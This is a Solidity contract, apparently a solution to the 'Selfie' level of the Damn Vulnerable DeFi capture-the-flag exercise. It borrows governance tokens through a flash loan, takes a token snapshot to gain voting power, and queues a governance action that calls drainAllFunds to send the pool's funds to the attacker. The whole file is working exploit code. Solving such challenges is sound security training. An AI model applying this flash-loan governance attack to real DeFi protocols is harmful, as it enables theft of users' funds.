// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "./SimpleGovernance.sol";

contract Attack3 {
    DamnValuableTokenSnapshot token;
    SelfiePool pool;
    SimpleGovernance governance;
    
    address hacker;

    constructor(DamnValuableTokenSnapshot _token, SelfiePool _pool, SimpleGovernance _governance) {
        token = _token;
        pool = _pool;
        governance = _governance;
        hacker = msg.sender;
    }

    function receiveTokens(address _token, uint256 _amount) public {
        token.snapshot();
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", hacker);
        governance.queueAction(address(pool), data, 0);
        ERC20Snapshot(_token).transfer(address(pool), _amount);
    }

    function hack(uint256 _amount) public {
        pool.flashLoan(_amount);
    }
}